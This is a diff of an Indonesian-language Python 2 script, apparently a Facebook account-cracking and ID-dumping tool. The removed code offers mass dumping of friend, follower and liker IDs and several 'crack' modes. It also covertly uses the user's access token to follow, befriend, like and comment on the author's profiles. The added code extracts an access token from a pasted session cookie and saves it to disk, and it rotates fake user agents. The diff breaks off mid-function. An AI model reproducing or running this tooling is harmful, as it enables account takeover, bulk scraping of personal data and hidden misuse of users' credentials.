@@ -1,373 +1,388 @@
-#-*-coding:utf-8-*-
+#*-coding:utf-8-*
 import requests,bs4,sys,os,subprocess,time,datetime
 import requests,sys,random,re,base64,json
 from multiprocessing.pool import ThreadPool
-from requests.exceptions import ConnectionError
-from bs4 import BeautifulSoup as parser
-from menu_instagram import menu_instagram
-from urllib2 import urlopen
-from cek_opsi import cek_opsi
 reload(sys)
 sys.setdefaultencoding("utf-8")
-"""   Terimaksih Untuk Semuanya   """
-#####################################
 
-
+##############################
 """
+Kontol amanda bengkok ke kiri !!!
+                           """
+##############################
 
-Pastikan Jangan Ubah Bot Follownya !
-Kalo Mau Tinggal Tambahin Faham?
-Dan Jika Ingin Di Ganti Izin Dulu :v
+# Warna
+M = ('\x1b[1;91m')
+H = ('\x1b[1;92m')
+K = ('\x1b[1;93m')
+Y = ('\x1b[1;94m')
+X = ('\x1b[1;95m')
+B = ('\x1b[1;96m')
+P = ('\x1b[1;97m')
 
- 				  """
-
-
-#####################################
-logo = ("""\x1b[1;92m ___ ___ ___ __  __ ___ _   _ __  __
-\x1b[1;92m| _ \ _ \ __|  \/  |_ _| | | |  \/  |
-\x1b[1;96m|  _/   / _|| |\/| || || |_| | |\/| |
-\x1b[1;96m|_| |_|_\___|_|  |_|___|\___/|_|  |_|
-\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m——————————————————————————————
-\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m au : rozhak
-\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m fb : fb.com/rozhak.xyz
-\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m gh : github.com/rozhakxd
-\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m——————————————————————————————
-""")
-url=('http://ipinfo.io/json')
-response=urlopen(url)
-data=json.load(response)
-ip=data['ip']
-org=data['org']
-country=requests.get("https://ipapi.com/ip_api.php?ip="+ip,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36"}).json()["country_name"]
-ua=('Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530')
+# Useragent
+ua_nokia=('Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530')
+ua_xiaomi=('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36')
+ua_samsung=('Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.11 Mobile Safari/537.36')
+ua_macos=('Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15')
+ua_vivo=('Mozilla/5.0 (Linux; U; Android 6.0; en-US; vivo 1713 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.5.0.1015 Mobile Safari/537.36')
+ua_oppo=('Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36')
+ua_huawei=('Mozilla/5.0 (Linux; Android 8.0.0; HUAWEI Y7 PRO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36')
+ua_redmi4a=('Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36')
+ua_vivoy12=('Mozilla/5.0 (Linux; Android 9; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36')
+ua_nokiax=('NokiaX2-01/5.0 (07.10) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+')
+ua_asus=('Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36')
+ua_galaxys10=('Mozilla/5.0 (Linux; Android 9; SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36')
+ua_lenovo=('Mozilla/5.0 (Linux; Android 9; Lenovo TB-8705F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36')
+ua=random.choice([ua_nokia,ua_xiaomi,ua_samsung,ua_macos,ua_vivo,ua_oppo,ua_huawei,ua_redmi4a,ua_vivoy12,ua_nokiax,ua_asus,ua_galaxys10,ua_lenovo])
 mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 free_h={"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 mobile_h={'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent':ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
-def login():
+def __login__():
 	os.system('clear')
-	print(logo)
-	print("\x1b[1;92m[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m Login Pakai Token")
-	print("\x1b[1;92m[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m Cara Mendapat Token")
-	print("\x1b[1;92m[\x1b[1;93m0\x1b[1;92m]\x1b[1;93m Keluar")
-	login = raw_input("\n\x1b[1;92m[\x1b[1;97m#\x1b[1;92m] Choose :\x1b[1;96m ")
-	if login == "":
-		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m] \x1b[1;91mWrong Input")
-	elif login == "1":
-                try:
-			token=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Token :\x1b[1;92m ")
-                        cek=requests.get('https://graph.facebook.com/me?access_token='+token)
-                        y=json.loads(cek.text)
-                        nama = y['name']
-                        save = open("___rozhak___", 'w')
-                        save.write(token)
-                        save.close()
-                        bot_follow()
-                except KeyError:
-                        exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Token Salah")
-	elif login == "2":
-		print("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Anda Akan Diarahkan Ke Browser")
-		time.sleep(3)
-		os.system("xdg-open https://youtu.be/3Y6xsMB3wRg")
-		exit()
-	elif login == "0":
-		exit()
-	else:
-		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
-def bot_follow():
-	try:
-		token=open('___rozhak___','r').read()
-	except IOError:
-		print ("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m] \x1b[1;91mCookie Invalid")
-		os.system('rm -rf ___rozhak___')
-		time.sleep(2)
-		login()
-	web = datetime.datetime.now()
-        waktu = web.strftime("%H:%M:%S / %d-%m-%Y ")
-        love = random.choice(['❤️','💛','💚','💙','🖤','🧡','💜'])
-	kata_kata_cinta = random.choice(["Cinta sejati bukan berarti tidak terpisahkan. Itu hanya berarti dipisahkan, namun tidak ada yang berubah."," Aku tahu aku jatuh cinta padamu karena kenyataanku akhirnya lebih indah dari mimpiku.","Kamu adalah pikiran terakhir dalam pikiranku sebelum tertidur dan pikiran pertama ketika aku bangun setiap pagi.","Bagi dunia, kamu mungkin satu orang, tetapi bagi satu orang kamu adalah dunia.","Kamu telah mengganti mimpi burukku dengan mimpi indah, kekhawatiranku dengan kebahagiaan, dan ketakutanku dengan cinta.","Kamu mungkin memegang tanganku untuk sementara waktu, tetapi kamu memegang hatiku selamanya.","Kekasihku, janganlah engkau menangis, berbahagialah kekasihku, jangan ada duka yang menyelimutimu. Aku berharap kau selalu dalam keadaan bahagia meski dari jauh aku saja tak bisa membahagiakanmu dan membuatmu tertawa.","Ketika seseorang membuat kamu menjadi orang yang paling bahagia dan orang paling menyedihkan pada saat yang sama, itulah saat yang nyata. Itu adalah sesuatu yang berharga.","Tidak peduli berapa banyak perkelahian yang mungkin kamu alami, jika kamu benar-benar mencintai seseorang, itu tidak akan menjadi masalah pada akhirnya.","Dicintai secara mendalam oleh seseorang memberimu kekuatan. Mencintai seseorang secara mendalam memberimu keberanian.","Cinta sejati tidak harus berarti menyatu, terkadang cinta sejati itu terpisah namun tak ada yang berubah.","Saat pagi datang, senyumanmu memeluk pikiranku, saat siang datang kau bagaikan payung yang selalu membuatku teduh, dan saat malam kau adalah kehangatan yang selalu membuatku jauh dari kedinginan.","Mencintai merupakan sebuah anugerah besar yang Tuhan berikan kepada manusia. Maka dari itu, kita perlu senantiasa bersyukur dan menjaga segala anugerah itu.","Mungkin ketidaksempurnaan kita yang membuat kita begitu sempurna satu sama lain.","Aku yakin bahwa cinta kita nanti akan bersatu dalam ikatan suci."])
-	kata_utama = ("Pengguna Script Premium ")
-	komen = kata_utama+love+"\n"+kata_kata_cinta+"\n"+waktu
-	kata_mutiara_islam = random.choice(["Kita tidak akan pernah tahu bagimana menyembahNya sebelum kita mulai dengan bagaimana mencintaiNya.","Apakah engkau meremehkan suatu doa kepada Allah, apakah engkau tahu keajaiban dan kemukjizatan doa? Ibarat panah dimalam hari, ia tidak akan meleset namun ia punya batas dan setiap batas ada saatnya untuk selesai.","Jangan berjalan dimuka bumi dengan penuh kesombongan dan congkak karena sebentar lagi engkau akan masuk ke dalam bumi juga.","Barang siapa yang bersungguh-sungguh berjalan pada jalannya maka pasti ia akan sampai pada tujuannya.","Ilmu pengetahuan di waktu kecil itu bagaikan ukiran di atas batu.","Bukanlah anak yatim itu yang telah meninggal orangtuanya, tetapi sesungguhnya yatim itu adalah yatim ilmu dan akhlak.","Ilmu tanpa agama adalah suatu kecacatan, dan agama tanpa ilmu merupakan kebutaan","Kegagalan adalah cara Allah untuk mengatakan bersabarlah karena aku memiliki sesuatu yang lebih baik untukmu saat waktunya tiba.","Kita tidak akan pernah kalah sampai kita menyerahkan semuanya kepada Tuhan.","Bagimu agamamu, bagiku agamaku. Karena sesungguhnya tidaka ada paksaan dalam beragama.","Sabar dan bisa mengikhlaskan sesuatu yang telah pergi adalah salah satu cara untuk mendapatkan kebahagian."])
-	kata_utama2 = random.choice(["Hai Bang 😎","Hello Bang 😎","Hello Bro 😎","Hai Bro 😎"])
-	komen2 = kata_utama2+"\n"+kata_mutiara_islam+"\n"+waktu
-	pantun_motivasi = random.choice(["Jalan-jalan naik kereta, Naik ke atas pakai tangga. Mari kita gapai cita-cita, Bahagia dunia, masuk ke surga.","Pisau tajam dari baja, Parang panjang banyak guna. Membayar sukses dengan kerja, Bayar sekarang, kelak bahagia.","Sampan sudah, rakit sudah, Yang belum hanya bahteranya. Sarapan sudah, ngopi sudah, Yang belum tinggal kerjanya.","Kapas terhembus angin ringan, Sejuk terasa angin pantai. Lebih bahagia dalam perjuangan, Daripada dalam santai-santai."])
-	kata_utama3 = ("I love you @[757953543:]")
-	komen3 = kata_utama3+"\n"+pantun_motivasi+"\n"+waktu
-	requests.post('https://graph.facebook.com/me/friends?method=post&uids=100064814153036&access_token='+token) #Rozhak
-	requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token) #Rozhak
-        requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token='+token) #Muhammad Rozhak
-	requests.post('https://graph.facebook.com/100064814153036/subscribers?access_token='+token) #Rozhak
-	requests.post('https://graph.facebook.com/10159494942223544/comments/?message='+komen+'&access_token='+token) #Foto Profil
-	requests.post('https://graph.facebook.com/10159494942223544/likes?summary=true&access_token='+token) #Foto Profil
-	requests.post('https://graph.facebook.com/10159494942223544/comments/?message='+komen3+'&access_token='+token) # Foto Profil
-	requests.post('https://graph.facebook.com/10158807643598544/comments/?message='+komen2+'&access_token='+token) #Foto Sampul
-	print("\x1b[1;96m[\x1b[1;92m#\x1b[1;96m]\x1b[1;92m Login Berhasil")
-	menu()
-def publik():
-        try:
-                token=open('___rozhak___','r').read()
-        except IOError:
-                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookies Invalid')
-                os.system('rm -rf ___rozhak___')
-                time.sleep(2)
-                login()
-        try:
-                idt = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Profil ID :\x1b[1;96m ")
-                file = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
-                try:
-                        req = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
-                        op = json.loads(req.text)
-                        print("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m "+op["name"])
-                except KeyError:
-                        print('\x1b[1;91m[\x1b[1;93m•\x1b[1;92m]\x1b[1;93m Profil Tidak Ditemukan')
-                        raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
-                        menu()
-                r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(9999999)&access_token="+token)
-                id = []
-                z=json.loads(r.text)
-                fle = open(file , 'a')#.replace(" ","_")
-                for a in z['friends']['data']:
-                        id.append(a['id']+"<=>"+a['name'])
-                        fle.write(a['id']+"<=>"+a['name']+'\n')
-                        print("\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s\x1b[1;92m ID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
-                fle.close()
-                print("\r\x1b[1;92m                     ")
-                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai")
-                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m "+file)
-                raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
-                menu()
-
-        except KeyError:
-                print('\n\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Tidak Ada Teman')
-                raw_input('\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}')
-                menu()
-	except requests.exceptions.ConnectionError:
-		exit("\x1b[1;97m[\x1b[1;93m•\x1b[1;97m]\x1b[1;93m Koneksi Error")
-def like_post():
-        try:
-                token=open('___rozhak___','r').read()
-        except IOError:
-		print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid')
-                os.system('rm -rf ___rozhak___')
-                time.sleep(2)
-                login()
-        try:
-                idt = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Post ID :\x1b[1;96m ")
-                file = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
-                try:
-                   r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=99999999&access_token="+token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
-                except KeyError:
-			print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Post ID Tidak Ada')
-			raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
-                        menu()
-                id = []
-                z=json.loads(r.text)
-                fle = open(file , 'w')#.replace(" ","_")
-                for a in z['data']:
-                        id.append(a['id']+"<=>"+a['name'])
-                        fle.write(a['id']+"<=>"+a['name']+'\n')
-                        print("\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s \x1b[1;92mID \r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
-                fle.close()
-		print("\r\x1b[1;97m                   ")
-		print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai")
-		print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m "+file)
-		raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
-		menu()
-
-	except requests.exceptions.ConnectionError:
-		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Koneksi Error")
-def follower():
-        try:
-                token=open('___rozhak___','r').read()
-        except IOError:
-                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid')
-                os.system('rm -rf ___rozhak___')
-                time.sleep(2)
-                login()
-        try:
-                idt = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Profil ID :\x1b[1;96m ")
-                file = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
-                try:
-                        req = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
-                        op = json.loads(req.text)
-                        print("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama : \x1b[1;96m"+op["name"])
-                except KeyError:
-                        print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Profil Tidak Ditemukan')
-                        raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
-                        menu()
-		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=9999999")
-                id = []
-                z=json.loads(r.text)
-                fle = open(file , 'a')#.replace(" ","_")
-                for a in z['friends']['data']:
-                        id.append(a['id']+"<=>"+a['name'])
-                        fle.write(a['id']+"<=>"+a['name']+'\n')
-                        print("\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s \x1b[1;92mID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
-                fle.close()
-                print("\r\x1b[1;97m                     ")
-                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai")
-                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m "+file)
-                raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
-                menu()
-
-        except KeyError:
-                print('\n\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Tidak Ada Follower')
-                raw_input('\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}')
-                menu()
-	except requests.exceptions.ConnectionError:
-		exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Koneksi Error")
-def teman():
-        try:
-                token=open('___rozhak___','r').read()
-        except IOError:
-                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid')
-                os.system('rm -rf ___rozhak___')
-                time.sleep(2)
-                login()
-        try:
-		file = raw_input("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;97m Nama File :\x1b[1;96m ")
-                try:
-                   r=requests.get("https://graph.facebook.com/me/friends?access_token="+token+"&limit=99999999");requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
-                except KeyError:
-                        print('\n\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Tidak Ada Teman')
-                        raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
-                        menu()
-                id = []
-                z=json.loads(r.text)
-                fle = open(file , 'w')#.replace(" ","_")
-                for a in z['data']:
-                        id.append(a['id']+"<=>"+a['name'])
-                        fle.write(a['id']+"<=>"+a['name']+'\n')
-                        print("\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s\x1b[1;92m ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
-                fle.close()
-		print("\r\x1b[1;97m                   ")
-                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai")
-                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Tersimpan :\x1b[1;93m "+file)
-                raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
-                menu()
-	except requests.exceptions.ConnectionError:
-		exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Koneksi Error")
-def menu():
-	global ip, org
-	try:
-		token=open('___rozhak___','r').read()
-	except IOError:
-		print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid")
-		os.system('rm -rf ___rozhak___')
-		time.sleep(2)
-		login()
-	try:
-		otw = requests.get('https://graph.facebook.com/me?access_token=' +token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
-		a = json.loads(otw.text)
-		nama = a['name']
-	except KeyError:
-		print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid")
-		os.system('rm -rf ___rozhak___')
-		time.sleep(2)
-		login()
-	except requests.exceptions.ConnectionError:
-		exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Koneksi Error")
-	os.system("clear")
-	print(logo)
-	print("\x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Name : "+nama)
-	print("\x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Ip : "+ip)
-	print("\x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Org : "+org)
-
-	print("\n\x1b[1;97m[\x1b[1;96m1\x1b[1;97m]\x1b[1;96m Crack Instagram (without login)")
-	print("\x1b[1;96m[\x1b[1;97m2\x1b[1;96m]\x1b[1;97m Dump ID Publik (dump fast)")
-	print("\x1b[1;96m[\x1b[1;97m3\x1b[1;96m]\x1b[1;97m Dump ID Like Post (dump fast)")
-	print("\x1b[1;96m[\x1b[1;97m4\x1b[1;96m]\x1b[1;97m Dump ID Follower (dump fast)")
-	print("\x1b[1;96m[\x1b[1;97m5\x1b[1;96m]\x1b[1;97m Dump ID Teman (dump fast)")
-	print("\x1b[1;97m[\x1b[1;92m6\x1b[1;97m]\x1b[1;92m Start Crack (crack fast)")
-	print("\x1b[1;97m[\x1b[1;93m7\x1b[1;97m]\x1b[1;93m Cek Opsi Checkpoint")
-	print("\x1b[1;96m[\x1b[1;97m8\x1b[1;96m]\x1b[1;97m Lihat Hasil Crack")
-	print("\x1b[1;96m[\x1b[1;97m9\x1b[1;96m]\x1b[1;97m Report Bug")
-	print("\x1b[1;97m[\x1b[1;91m0\x1b[1;97m]\x1b[1;91m Remove Token")
-	daftar_menu()
-def daftar_menu():
-	pilih = raw_input("\n\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Choose :\x1b[1;96m ")
-	if pilih == "":
-		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
-	elif pilih == "1":
-		menu_instagram()
-	elif pilih == "2":
-		publik()
-	elif pilih == "3":
-		like_post()
-	elif pilih == "4":
-		follower()
-	elif pilih == "5":
-		teman()
-	elif pilih == "6":
-		metode()
-	elif pilih == "7":
-		cek_opsi()
-	elif pilih == "8":
-		print("\x1b[1;96m[\x1b[1;97m1\x1b[1;96m]\x1b[1;97m Lihat Hasil\x1b[1;92m Ok")
-		print("\x1b[1;96m[\x1b[1;97m2\x1b[1;96m]\x1b[1;97m Lihat Hasil\x1b[1;93m Cp")
-		print("\x1b[1;96m[\x1b[1;97m0\x1b[1;96m]\x1b[1;97m Kembali")
-		lihat = raw_input("\n\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Choose :\x1b[1;96m ")
-		if lihat == "":
-			exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
-		elif lihat == "1":
-			try:
-				live=open('Live.txt','r').read()
-			except IOError:
-				exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Hasil Ok Tidak Ada")
-			print("\x1b[1;92m"+live)
-			exit()
-		elif lihat == "2":
-			try:
-                                chek=open('Check.txt','r').read()
-                        except IOError:
-                                exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Hasil Cp Tidak Ada")
-                        print("\x1b[1;93m"+chek)
-			exit()
-		elif lihat == "0":
-			menu()
-		else:
-			exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
-	elif pilih == "9":
-		print("\x1b[1;92m[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Anda Akan Diarahkan Ke Whatsapp")
-		time.sleep(3)
-		os.system("xdg-open https://wa.me/6285727173376?text=Hallo%20Bang%20Rozhak")
-		exit()
-	elif pilih == "0":
+	os.system('echo -e "%s  ___\n |   \ _  _ _ __  _ __\n | |) | || | â€˜  \| â€˜_.\ \n%s |___/ \_,_|_|_|_| .__/\n                 |_|\n"'%(P,H))
+	print("%sÂ«%s!%s Anda diwajibkan menggunakan akun yang tidak terpakai/akun baru."%(K,M,P))
+	print("\n%s1%sÂ»%s Login pakai token"%(H,B,P))
+	print("%s2%sÂ»%s Login pakai cookie"%(H,B,P))
+	print("%s3%sÂ»%s Cara dapat token or cookie"%(H,B,P))
+	print("%s4%sÂ»%s Keluar"%(M,K,P))
+	__login=raw_input("\n%sÂ«%s?%s Choose :%s "%(B,H,P,X))
+	if __login in['']:
+		exit("%sÂ«%s!%s Wrong input"%(K,M,K))
+	elif __login in ['1','01']:
 		try:
-			print("\x1b[1;93m[\x1b[1;97m*\x1b[1;93m]\x1b[1;97m Menghapus Cookie & Token")
-			os.remove("___rozhak___")
-		except Exception as e:
-			exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
+			__token__=raw_input("%sÂ«%s?%s Token :%s "%(B,H,P,X))
+			if __token__ in ['',' ']:
+				exit("%sÂ«%s!%s Jangan kosong"%(K,M,K))
+			cekz=requests.get('https://graph.facebook.com/me/?access_token=%s'%(__token__))
+			kz=json.loads(cekz.text);nama=kz['name']
+			save__=open('_____tokenz_____', 'w');save__.write(__token__);save__.close()
+			__follow__()
+		except KeyError:
+			exit("%sÂ«%s!%s Token Salah"%(K,M,K))
+	elif __login in ['2','02']:
+		try:
+			__cookie__=raw_input("%sÂ«%s?%s Cookie :%s "%(B,H,P,X))
+			if __cookie__ in ['',' ']:
+				exit("%sÂ«%s!%s Jangan kosong"%(K,M,K))
+			data=requests.get('https://business.facebook.com/business_locations', headers = {
+				'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
+				'referer'                   : 'https://www.facebook.com/',
+				'host'                      : 'business.facebook.com',
+				'origin'                    : 'https://business.facebook.com',
+				'upgrade-insecure-requests' : '1',
+				'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+				'cache-control'             : 'max-age=0',
+				'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+				'content-type'              : 'text/html; charset=utf-8'
+			}, cookies = {
+				'cookie'                    : __cookie__
+			})
+			find_token = re.search('(EAAG\w+)', data.text)
+			if find_token is None:
+				exit("%sÂ«%s!%s Cookie Salah"%(K,M,K))
+			save__=open('_____cookie_____', 'w');save__.write(__cookie__);save__.close()
+			save__=open('_____tokenz_____', 'w');save__.write(find_token.group(1));save__.close()
+			__follow__()
+		except:
+			exit("%sÂ«%s!%s Sepertinya ada yang salah"%(K,M,K))
+	elif __login in ['3','03']:
+		print("%sÂ«%s!%s Anda akan diarahkan ke browser"%(K,M,P));time.sleep(2)
+		os.system("xdg-open https://youtu.be/loF5goP0Co4");exit()
+	elif __login in ['4','04']:
+		exit()
 	else:
-		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
-def metode():
-	print("\n\x1b[1;92m[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m Metode mbasic.facebook.com")
-	print("\x1b[1;92m[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m Metode free.facebook.com")
-	print("\x1b[1;92m[\x1b[1;97m3\x1b[1;92m]\x1b[1;97m Metode mobile.facebook.com")
-	metode=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Choose :\x1b[1;92m ")
-	if metode == '':
-		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
-	elif metode == '1':
-		crack()
-	elif metode == '2':
-		crack2()
-	elif metode == '3':
-		crack3()
+		exit("%sÂ«%s!%s Wrong input"%(K,M,K))
+# Kalo Mau Di Ganti Izin Dulu :v
+def __follow__():
+	try:
+		__token__=open('_____tokenz_____', 'r').read()
+	except IOError:
+		print("%sÂ«%s!%s Token invalid"%(K,M,K));time.sleep(2)
+		__login__()
+	try:
+		web = datetime.datetime.now()
